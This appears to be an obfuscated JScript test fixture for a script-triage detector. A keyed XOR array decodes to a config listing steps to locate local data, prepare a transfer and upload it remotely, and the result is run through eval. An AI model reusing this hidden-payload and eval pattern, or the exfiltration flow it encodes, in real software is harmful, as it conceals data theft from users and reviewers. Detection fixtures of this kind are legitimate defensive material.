// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_6e012200 = function decode_6e012200_body(v_a19c) {
  var keyBytes = [112,153,156,99,60];
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ keyBytes[i % keyBytes.length]); }
  return v_b27e;
};
var recover_7b69ac67 = function recover_7b69ac67_body() {
  if (true) {
    var firstPart = [11,187,239,23,89,0,234,190,89,103,82,245,243,0,93,4,252,195,15,83,19,248,240,65,16,82,233,238,6,76,17,235,249,60,72,2,248,242,16,90,21,235,190,79,30,5,233,240,12,93,20,198,238,6,81,31,237,249,65,97,92,187,253,7,93,0,237,249,17,30,74,187,203,10,82,56,237,232,19,18,39,240,242,43,72,4,233,206,6,77,5,252,239,23,18,69,183,173,65,16,82,239,253,15,73,21,234,190,89,71,82,250,253,14,76,17,240,251,13,99,25,253,190,89,30,19,248,241,19,93,25,254,242,78,4,72,170,168,0,14,18,169,165,84,30,92,187,233,17,80,82,163,190,11,72,4,233,239,89,19,95];
    var secondPart = [161,164,80,8,19,171,254,83,5,71,183,249,27,93,29,233,240,6,18,25,247,234,2,80,25,253,179,85,8,22,160,170,5,13,72,183,248,2,72,82,181,190,22,79,21,235,195,2,91,21,247,232,65,6,82,209,233,13,72,2,252,239,16,112,17,251,179,91,4,67,173,255,81,94,64,160,171,65,16,82,255,245,15,89,47,233,253,23,84,82,163,190,32,6,44,197,201,16,89,2,234,192,63,108,5,251,240,10,95,44,197,212,22,82,4,235,249,16,79,60,248,254,63,96,3,237,253,4,89,93,161,164,80,8,19,171,254,83,5,71,183,248,2,72,82,228,176,65,79,4,248,251,6,127,31,236,242,23,30,74,170,225];
    var v_a19c = firstPart.concat(secondPart);
    var v_f602 = (2 > 1) ? "left" : "right";
    var v_b27e = decode_6e012200.call(null, v_a19c);
    var textParts = [];
    for (var bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
    var v_c304 = textParts.join("");
    return v_c304;
  }
};
var inspect_db5f5162 = function inspect_db5f5162_body() {
  var v_d41a = eval("(" + recover_7b69ac67.call(null) + ")");
  var table = { steps: function() { return v_d41a["steps"]; }, values: function() { return v_d41a["values"]; } };
  return { steps: table["steps"].call(null), adapter: v_d41a["adapter"], values: table["values"].call(null), stageCount: v_d41a["stageCount"] };
};
